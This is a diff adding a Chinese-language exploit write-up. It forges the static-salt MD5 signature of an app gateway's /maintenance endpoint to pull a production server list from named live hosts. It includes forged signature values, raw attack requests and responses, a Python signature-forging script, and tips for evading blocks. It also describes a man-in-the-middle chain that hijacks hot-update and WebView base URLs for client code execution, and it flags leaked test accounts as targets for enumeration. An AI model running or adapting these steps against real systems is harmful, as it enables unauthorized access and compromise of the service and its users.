@@ -1,0 +1,247 @@
+# 自研 App 网关 /maintenance 生产渠道签名伪造 → 下发全量服务器清单（abUrl/shareUrl）→ 热更与 WebView 基址劫持致客户端代码执行
+
+- **code**: app-maintenance-vip1-server-list-disclosure-hotupdate-hijack
+- **kind**: poc
+- **category**: rce
+- **component**: 自研 App 后端网关 /maintenance（IIS + JSON，channel 渠道开关）
+- **severity**: high
+- **language**: http
+- **source**: self
+- **verified**: 1
+- **verified_note**: task#614，2026-11-04，多主机复测（固定出口代理 auto_off，单发不重放、间隔≥3s）：
+① xwkd.nahtvz.com:47000（23:1x-23:2x UTC+8）：离线复算 verify=FB5165E02EBEC83521C2720747EF3B23（channel=vip_1、devicetype=2）→ HTTP 200 / Content-Length 2113 / {"ret":0,"data":{"ip":"<出口IP>","runtime":"100","servers":[26 条]}}，含 type2 abUrl=https://ime8.fp32xa.com 等 3 条、type3 photoUrl=https://ga7o.h86l3w.com:57632、type4 shareUrl=http://sp2.hnlbds.com:2977（明文 http）、type9 wss://…；回包字段仅 ret/data/servers/comment，无 sign/hmac。
+② sjan.o0hyfmi.club:47000（intent 8841，脚本 run_maint.py，原始响应落盘 R9_channel_vip_1.txt / R10_vip_1_iostype.txt）：同算法 verify=ED2908FCC07A2598AABF42B1BA2D65A7（gametype=1,token=123,version=0.0.0.1,type=1,channel=vip_1,devicetype=2,deviceid=0000000000000000）→ HTTP 200 / 2113B / Server: Microsoft-IIS / {"ret":0,"data":{"ip":"79.33.215.18","runtime":"100","servers":[26 条：7 维护节点 + 10 业务 API 节点（含 5 个裸 IP:46750，跨 CN/HK/US/MY/GL）+ 3 热更 abUrl + 图片/头图/日志 WS + shareUrl],"comment":"{\"reviewversion\":[{\"name\":\"0.9\",\"state\":1}],\"testaccount\":[\"testcc\",\"testcc1\",\"testcc2\",\"testcc3\"]}"}}；OPTIONS /maintenance 返回 Access-Control-Allow-Origin: *。
+③ 对照（同一主机）：错误 verify=0×32 → 200 / 39B / {"ret":1,"msg":"参数检查失败！"}；channel=105001（或 105）/ devicetype=android → 200 / 9B / {"ret":0} 空壳；channel=vip_1 → 2113B 全量清单。证明签名校验存在但可离线伪造，真正的下发开关是 channel 生产实值。
+④ 多主机一致性：c8nz.tx5o8mt.cc:47000、139.95.8.40:47000 复测同样 200/2113B，servers[] 逐字节一致、仅 data.ip 随出口变化 → 同一生产配置集群，非单机伪造。
+⑤ 边界：sjan 主机上仅发起只读 POST、未对 servers 内任何主机发请求（仅被动 DNS/RDAP，均为运营方活跃持有）；单机未授权访问的独立影响为拓扑/运营配置泄露（info-leak/medium），"任意代码执行"依赖中间人位置或对维护域回包的可控性，按可利用设计缺陷定性。
+定性说明：以上证据在 info-leak 档（未授权读取完整清单）与 rce 档（abUrl/shareUrl 无白名单 + 无独立验签）两处同时成立，本条保留 rce/high 的原始定性，单机场景请按 info-leak/medium 上报。
+- **path**: pocs/app-maintenance-vip1-server-list-disclosure-hotupdate-hijack/poc.http
+- **tags**: maintenance, 签名伪造, 静态盐, md5, 客户端硬编码, 服务器清单泄露, abUrl, shareUrl, 热更新, webview, unity, mitm, 代码执行, 渠道枚举, iis, cors, testaccount, reviewversion
+- **created_at**: 2026-11-04T15:34:25.541Z
+- **engine**: https://sjan.o0hyfmi.club:47000/maintenance（同集群另见 https://xwkd.nahtvz.com:47000、c8nz.tx5o8mt.cc:47000、139.95.8.40:47000 等 7 条 maintainUrls）
+
+## 描述
+
+App 启动维护接口 /maintenance 的 verify 是「提交字段 + 客户端静态盐 private_maintenance」的自洽 MD5，任何第三方可离线复算，不构成鉴权。生产渠道值（vip_1）下服务端无签名地下发完整 servers[]：type2=热更 AB 基址(abUrl)、type3=图片域、type4=分享页基址(shareUrl，明文 http)、type8/9=静态与日志 WS，并在 comment 里附带 reviewversion 审核开关与 testaccount 测试账号。客户端对 abUrl 用 UnityWebRequest 拉热更程序集、对 shareUrl+"/index.html?data=" 直接 UniWebView.Load，均无域名/协议白名单且证书校验恒通过，故处于中间人位置或能控制任一维护域回包者可把基址指向攻击者主机，实现客户端任意 C# 热更程序集注入与 HTML+JS 执行；仅有单机访问权时其影响是生产拓扑与运营配置未授权泄露。
+
+## 用法
+
+```
+前置：浏览器 UA（curl 默认 UA 被 403 TEST-ERROR）、Content-Type: application/json;charset=utf-8、HTTPS 自签需 -k、固定出口 IP、单发不重放间隔≥3s。
+
+① 复算 verify（裸 key 拼裸 value，按 key 字典序，末尾接盐 private_maintenance，MD5 大写）：
+  signstr = channel+vip_1 deviceid+0000000000000000 devicetype+2 gametype+1 token+123 type+1 version+0.0.0.1 + private_maintenance
+  实测 = channelvip_1deviceid0000000000000000devicetype2gametype1token123type1version0.0.0.1private_maintenance → ED2908FCC07A2598AABF42B1BA2D65A7
+  （另一组 version=1.0.0.9 / deviceid=a1b2c3d4e5f60718 → FB5165E02EBEC83521C2720747EF3B23）
+
+② 打生产渠道（sjan 实测原始请求）：
+POST /maintenance HTTP/1.1
+Host: sjan.o0hyfmi.club:47000
+Content-Type: application/json;charset=utf-8
+
+{"gametype":"1","token":"123","version":"0.0.0.1","type":1,"channel":"vip_1","devicetype":"2","deviceid":"0000000000000000","verify":"ED2908FCC07A2598AABF42B1BA2D65A7"}
+
+成功判据：200 + Content-Length 2113 + {"ret":0,"data":{"ip":"<你的出口IP>","runtime":"100","servers":[26 条],"comment":"{\"reviewversion\":[...],\"testaccount\":[...]}"}}。
+servers[] 里 type==2 即热更基址、type==4 即分享页基址（明文 http 优先）。
+
+③ 判据分层（先证签名有效，再证数据面）：
+  - 错误 verify（32 个 0）→ 200 / 39B / {"ret":1,"msg":"参数检查失败！"} ⇒ 服务端确实校验 verify
+  - 复算 verify + 非生产渠道（105001/105）→ 200 / 9B / {"ret":0} ⇒ 签名通过但租户未配置
+  - 复算 verify + channel=vip_1 → 200 / 2113B 全量清单 ⇒ 未授权读取成立
+  任何"只有 9 字节空壳"的结果都应先怀疑 channel 值，而不是签名算错。
+
+④ 情报面：OPTIONS /maintenance 返回 Access-Control-Allow-Origin: *（跨域可读）；comment 字段直接给出 reviewversion（审核版本开关）与 testaccount（测试账号名，本次为 testcc/testcc1-3），属运营配置泄露，可做后续定向攻击与账号枚举起点。
+
+⑤ 换目标/换主机：同一套集群的任一 maintainUrls 重打应得 2113B，servers[] 逐字节一致、仅 data.ip 变化；不一致说明不是同一配置源。
+
+⑥ 消费链确认（决定算不算代码执行，三处都成立才上报 rce）：
+  a. servers[i].type==2 → HttpManage.abUrl，type==4 → shareUrl，持久化后热更/分享页直接取用；
+  b. 热更基址拼 URL 后经 UnityWebRequest 下载 AB/程序集，只做服务端 md5 自引用比对、无独立公钥验签；
+  c. 分享页拼 shareName+"/index.html?data=" 后 UniWebView.Load，无域名/协议白名单，SdkAPI.BypassCertificate 恒 true。
+
+常见失败原因：UA 非浏览器→403 TEST-ERROR（不是签名问题）；拼接加了 = 或 &（公式是裸拼）；未按 key 字典序；verify 用了小写；channel 用了非生产值→只有 9 字节空壳；devicetype 用了字符串 android 而非客户端真实值 2；走共享代理导致 data.ip 是别人的出口（不影响清单读取）。
+```
+
+## 正文
+
+```
+## 一句话
+
+`/maintenance` 的 verify 是客户端可复算的自洽 MD5（非服务端密钥），生产渠道值 `vip_1` 下无签名回包直接给出 26 条服务器清单；清单里的热更基址（type2 abUrl）与分享页基址（type4 shareUrl）被客户端原样消费且无白名单/无验签 → 中间人可把基址指向攻击者主机，实现客户端任意 C# 热更程序集 / HTML+JS 执行。单机访问权下其独立影响为生产拓扑与运营配置未授权泄露。
+
+> 签名门本身的完整公式与阴性对照见知识库条目 `app-gateway-maintenance-static-salt-signature-forge`（id=523）。本条只补它当时没拿到的**数据面**：生产渠道、servers[] 全量、与消费链判定。523 里"data.servers[] 未出现、数据面未确认"的结论已被本条取代。
+
+## 前置条件
+
+- 入口：`POST https://<HOST>:47000/maintenance`，JSON
+- 必须伪装浏览器 UA（curl 默认 UA 一律 403 / `TEST-ERROR`）
+- `Content-Type: application/json;charset=utf-8`
+- 自签证书：`-k` / `verify=False`
+- 固定出口 IP（proxy auto_off），单发不重放、间隔 ≥3s
+- `channel` 必须是生产渠道实值（从客户端 `ChannelConfig.channelName` 字面量取，本目标 `vip_1`）；`devicetype` 用客户端真实值 `2`
+
+## 签名算法（逆向自客户端）
+
+```
+fields  = token, version, gametype, type, devicetype, deviceid, channel
+signstr = "".join(f"{k}{value[k]}" for k in sorted(fields)) + "private_maintenance"
+verify  = MD5(signstr).upper()        # 32 位大写
+```
+
+裸 key 拼裸 value，无 `=`、无 `&`、无分隔符；盐就是 `private_` + 路由名。盐来自客户端静态字符串，服务端做同样计算 → 任何第三方都可离线造出合法 verify。
+
+实测样本：
+
+```
+# sjan.o0hyfmi.club:47000（version=0.0.0.1）
+signstr = channelvip_1deviceid0000000000000000devicetype2gametype1token123type1version0.0.0.1private_maintenance
+verify  = ED2908FCC07A2598AABF42B1BA2D65A7
+
+# 同集群其它主机（version=1.0.0.9）
+signstr = channelvip_1deviceida1b2c3d4e5f60718devicetype2gametype1token123type1version1.0.0.9private_maintenance
+verify  = FB5165E02EBEC83521C2720747EF3B23
+
+# 非生产渠道对照
+signstr = channel105001deviceid0000000000000000devicetypeandroidgametype1token123type1version1.0.0.9private_maintenance
+verify  = 0C19F50440BD4B045E3DF6BC9DD45AFF
+```
+
+## 正向请求（生产渠道，拿到完整清单）
+
+```http
+POST /maintenance HTTP/1.1
+Host: <HOST>:47000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+Content-Type: application/json;charset=utf-8
+Connection: close
+
+{"gametype":"1","token":"123","version":"0.0.0.1","type":1,"channel":"vip_1","devicetype":"2","deviceid":"0000000000000000","verify":"ED2908FCC07A2598AABF42B1BA2D65A7"}
+```
+
+响应（sjan.o0hyfmi.club:47000 实测）：
+
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json;charset=utf-8
+Content-Length: 2113
+Server: Microsoft-IIS
+
+{"ret":0,"data":{"ip":"<请求方出口IP>","runtime":"100","servers":[
+  {"type":0,"addr":"https://xwkd.nahtvz.com:47000","weight":10,"area":"GL"},
+  ...
+  {"type":1,"addr":"https://cbob.evuzp9.com:46750","...": "裸 IP 业务 API 节点（5 个），跨 CN/HK/US/MY/GL 区域与 weight"},
+  {"type":2,"addr":"https://ime8.fp32xa.com","weight":99,"area":"HK"},
+  {"type":2,"addr":"https://qd16.xatqgl.club","weight":99,"area":"SG"},
+  {"type":2,"addr":"https://fmai.bszhan.com","weight":99,"area":"CN"},
+  {"type":3,"addr":"https://ga7o.h86l3w.com:57632","weight":99,"area":"HK"},
+  {"type":4,"addr":"http://sp2.hnlbds.com:2977","weight":99,"area":"HK"},
+  {"type":8,"addr":"https://wkry.j042ld.com","weight":99,"area":"HK"},
+  {"type":9,"addr":"wss://vndr.d6gepj.xyz/log","weight":99,"area":"HK"}
+],"comment":"{\"reviewversion\":[{\"name\":\"0.9\",\"state\":1}],\"testaccount\":[\"testcc\",\"testcc1\",\"testcc2\",\"testcc3\"]}"}}
+```
+
+servers[] 共 26 条，构成：7 个维护节点（type0）、10 个业务 API 节点（含 5 个裸 IP:46750）、3 个热更 abUrl、图片/头图域、2 路日志 WS、1 个分享页基址。type 语义：`2`=热更 AB 基址、`3`=图片域、`4`=分享页基址、`8/9`=静态与日志。
+
+关键点：
+- 回包字段只有 `ret / data / servers / comment`，**无 sign / hmac / 任何服务端签名字段**
+- `type4` 是**明文 http**，是最短的注入面（无需处理证书）
+- `comment` 直接带上运营开关与测试账号：`reviewversion[].state=1`（审核版本开关）、`testaccount=[testcc..]`
+- `OPTIONS /maintenance` 返回 `Access-Control-Allow-Origin: *` → 任意网页可跨域读到清单（浏览器内也可发起）
+
+## 判定：失败点是渠道值，不是签名
+
+同一算法、同一主机、只换 channel：
+
+```http
+POST /maintenance HTTP/1.1
+Host: <HOST>:47000
+Content-Type: application/json;charset=utf-8
+
+{"gametype":"1","token":"123","version":"0.0.0.1","type":1,"channel":"105001","devicetype":"2","deviceid":"0000000000000000","verify":"A7B1F96045F5745BA826457460C7C28F"}
+```
+
+响应：
+
+```http
+HTTP/1.1 200 OK
+Content-Length: 9
+
+{"ret":0}
+```
+
+再换一个明显错的 verify：
+
+```http
+{"...","channel":"105001",...,"verify":"00000000000000000000000000000000"}
+```
+
+```http
+HTTP/1.1 200 OK
+Content-Length: 39
+
+{"ret":1,"msg":"参数检查失败！"}
+```
+
+→ verify 从未失败；`channel` 才是下发开关。任何"只有 9 字节空壳"的结果都应先怀疑 channel 值，而不是签名算错。
+
+## 多主机一致性（排除单机伪造）
+
+对 `sjan.o0hyfmi.club:47000`、`c8nz.tx5o8mt.cc:47000`、`139.95.8.40:47000`、`xwkd.nahtvz.com:47000` 等 `ChannelConfig.maintainUrls` 重打同一请求：
+
+```
+HTTP/1.1 200 OK / Content-Length: 2113 / {"ret":0,"data":{"ip":"<不同出口IP>",...}}
+```
+
+`servers[]` 逐字节一致，仅 `data.ip` 随出口变化 → 这是同一套生产配置集群下发，`data.ip` 只是回显请求方地址。
+
+## 为什么算"代码执行"（消费链，三处全部成立才上报）
+
+1. **落地**：`servers[i].type==2 → HttpManage.abUrl`；`type==4 → shareUrl`。客户端拿到后持久化。
+2. **热更**：热更基址拼 URL 后经 `UnityWebRequest` 下载 AB / 托管程序集，只做"服务端给的 md5 vs 下载内容 md5"的自引用比对，**无独立公钥验签** → 攻击者换主机同时换 md5 即通过。
+3. **分享页**：`shareUrl + "/index.html?data=" + ...` 直接 `UniWebView.Load`，**无域名/协议白名单**；且 `SdkAPI.BypassCertificate` 恒 true（证书校验永不失败）。
+
+因此：处于网络中间位置、或能控制任一维护域回包的一方，把 abUrl/shareUrl 指到自己的主机，即可让客户端加载任意 C# 热更程序集（ILRuntime/Assembly 加载即执行）或任意 HTML+JS；同时服务端"已更新到 spX.X 版本"的校验被绕开（客户端根本没连真源站）。
+
+静态锚点（供换目标时对标）：`libil2cpp.so` `GetServerInfoCallBack` VA 0x31535E8 内，0x3153a78 `new Req_ServerInfo`、0x3153b10 `type=1`、0x3153b28 `devicetype=Int32.ToString(2)`、0x3153eb8 `List.Sort` ��� 0x3153f04 逐项 Concat → 0x3153f40 接盐 MD5 大写；盐 `private_maintenance` 为静态字符串。
+
+## 证伪条件（任一条成立就别报 rce）
+
+- 客户端对 abUrl / shareUrl 有域名白名单或强制 https + 证书钉扎
+- `/maintenance` 回包新增服务端签名且客户端真正校验
+- 热更程序集有独立硬编码公钥验签
+- 本轮实测：回包无任何签名字段，静态反汇编也未见白名单/公钥验签锚点
+
+## 边界（写报告时必须带上）
+
+- 触发需要**网络中间人位置**或对维护域回包的**可控性**；单靠 `/maintenance` 未授权访问本身只是清单/运营配置泄露（info-leak/medium）。
+- 本轮未投递、未向新登记的 abUrl/shareUrl 发起请求；"任意代码执行"按可利用设计缺陷定性。
+- 只读 POST、间隔 ≥3s、单次不重放；未对 servers[] 内任何主机发起请求（仅被动 DNS/RDAP）。
+
+## 复算/换值脚本
+
+```python
+import hashlib, json
+
+def make_verify(payload: dict, salt="private_maintenance") -> str:
+    items = {k: v for k, v in payload.items() if k != "verify"}
+    signstr = "".join(f"{k}{items[k]}" for k in sorted(items)) + salt
+    print("signstr =", signstr)
+    return hashlib.md5(signstr.encode()).hexdigest().upper()
+
+body = {"gametype": "1", "token": "123", "version": "0.0.0.1", "type": 1,
+        "devicetype": "2", "deviceid": "0000000000000000", "channel": "vip_1"}
+body["verify"] = make_verify(body)
+print(json.dumps(body, ensure_ascii=False))
+```
+
+## 常见失败原因
+
+- UA 非浏览器 → 403 `TEST-ERROR`（不是签名问题，别误判）
+- 拼接时加了 `=` 或 `&` → 必错，公式是裸拼
+- 未按 key 字典序（注意 `devicetype < gametype < token < type < version`）
+- verify 用了小写 MD5
+- `channel` 用了非生产值 → 只有 9 字节 `{"ret":0}` 空壳
+- `devicetype` 用了字符串 `android` 而非客户端真实值 `2`
+- 响应 2113B 但 `data.ip` 是别人的出口 → 你走了共享代理，本身不影响清单读取
+
+```
